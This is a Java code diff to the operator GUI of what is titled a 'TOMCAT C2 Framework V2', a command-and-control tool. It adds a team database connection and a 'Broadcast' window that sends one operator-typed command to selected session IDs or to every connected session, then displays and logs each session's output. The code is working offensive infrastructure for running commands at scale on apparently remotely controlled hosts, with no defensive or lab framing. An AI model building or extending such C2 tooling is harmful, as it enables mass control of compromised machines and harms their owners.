@@ -1,5 +1,6 @@
 package com.tomcat.iface;
 
+import com.tomcat.core.db.TeamDatabase;
 import com.tomcat.core.event.EventManager;
 import com.tomcat.core.event.EventManager.EventType;
 import com.tomcat.core.output.Logger;
@@ -29,6 +30,7 @@ import java.util.concurrent.Executors;
 
 public class GUI extends Application {
     private static ServerConfig Config;
+    private TeamDatabase Db;
     private TomcatServer Server;
     private Instant ServerStartTime;
     private final ObservableList<SessionRow> SessionRows = FXCollections.observableArrayList();
@@ -101,6 +103,7 @@ public class GUI extends Application {
 
     @Override
     public void start(Stage PrimaryStage) {
+        Db = TeamDatabase.Connect(Config);
         PrimaryStage.setTitle("TOMCAT C2 Framework V2");
         PrimaryStage.setWidth(1280);
         PrimaryStage.setHeight(800);
@@ -260,11 +263,13 @@ public class GUI extends Application {
 
         Button Refresh = StyledButton("⟳ Refresh", AccentColor, false);
         Button Execute = StyledButton("▶ Execute", GreenColor, false);
+        Button Broadcast = StyledButton("⇶ Broadcast", "#bc8cff", false);
         Button Kill = StyledButton("⊘ Kill", RedColor, false);
         Refresh.setOnAction(E -> RefreshSessions());
         Execute.setOnAction(E -> OpenExecuteWindow());
+        Broadcast.setOnAction(E -> OpenBroadcastWindow());
         Kill.setOnAction(E -> KillSelected());
-        Toolbar.getChildren().addAll(Search, Refresh, Execute, Kill);
+        Toolbar.getChildren().addAll(Search, Refresh, Execute, Broadcast, Kill);
         Content.getChildren().add(Toolbar);
 
         SessionTable = new TableView<>(SessionRows);
@@ -505,6 +510,79 @@ public class GUI extends Application {
         Win.setScene(new Scene(Layout));
         Win.show();
         Entry.requestFocus();
+    }
+
+
+    private void OpenBroadcastWindow() {
+        if (Server == null || !Server.IsRunning()) {
+            ShowAlert("Server not running"); return;
+        }
+        Stage Win = new Stage();
+        Win.setTitle("Broadcast Command");
+        Win.setWidth(600);
+        Win.setHeight(500);
+        VBox Layout = new VBox(8);
+        Layout.setPadding(new Insets(12));
+        Layout.setStyle("-fx-background-color: " + BgColor + ";");
+
+        HBox TargetRow = new HBox(8);
+        TargetRow.setAlignment(Pos.CENTER_LEFT);
+        Label TargetLbl = StyledLabel("Target:", 9, MutedColor, false);
+        TextField TargetField = new TextField();
+        TargetField.setPromptText("Session IDs: 1,2,3  or  all");
+        ApplyInputStyle(TargetField);
+        HBox.setHgrow(TargetField, Priority.ALWAYS);
+        TargetRow.getChildren().addAll(TargetLbl, TargetField);
+
+        TextArea Out = new TextArea();
+        Out.setEditable(false);
+        ApplyTermStyle(Out);
+        VBox.setVgrow(Out, Priority.ALWAYS);
+
+        HBox InputRow = new HBox(8);
+        InputRow.setAlignment(Pos.CENTER_LEFT);
+        TextField CmdField = new TextField();
+        CmdField.setPromptText("Enter command...");
+        ApplyInputStyle(CmdField);
+        HBox.setHgrow(CmdField, Priority.ALWAYS);
+        Button RunBtn = StyledButton("⇶ Broadcast", "#bc8cff", false);
+
+        Runnable DoBroadcast = () -> {
+            String Target = TargetField.getText().trim();
+            String Cmd    = CmdField.getText().trim();
+            if (Target.isEmpty() || Cmd.isEmpty()) return;
+            Out.appendText("⟳ Broadcasting [" + Target + "]: " + Cmd + "\n");
+            CmdField.clear();
+            Executors.newSingleThreadExecutor().submit(() -> {
+                Map<Integer, String[]> Results;
+                if (Target.equalsIgnoreCase("all")) {
+                    Results = Server.BroadcastAll(Cmd);
+                } else {
+                    java.util.List<Integer> Ids = new java.util.ArrayList<>();
+                    for (String S : Target.split(",")) {
+                        try { Ids.add(Integer.parseInt(S.trim())); }
+                        catch (NumberFormatException Ignored) {}
+                    }
+                    Results = Server.BroadcastCommand(Ids, Cmd);
+                }
+                final Map<Integer, String[]> FinalResults = Results;
+                Platform.runLater(() -> {
+                    for (Map.Entry<Integer, String[]> En : FinalResults.entrySet()) {
+                        boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
+                        Out.appendText("SESSION-" + En.getKey() + (Ok ? " ✔" : " ✘") + ":\n");
+                        Out.appendText(En.getValue()[1] + "\n\n");
+                        Db.SaveCommandLog(En.getKey(), "operator", Cmd, En.getValue()[1], Ok);
+                    }
+                });
+            });
+        };
+        RunBtn.setOnAction(E -> DoBroadcast.run());
+        CmdField.setOnAction(E -> DoBroadcast.run());
+        InputRow.getChildren().addAll(StyledLabel("❯", 11, AccentColor, true), CmdField, RunBtn);
+        Layout.getChildren().addAll(TargetRow, Out, InputRow);
+        Win.setScene(new Scene(Layout));
+        Win.show();
+        CmdField.requestFocus();
     }
 
     private void KillSelected() {
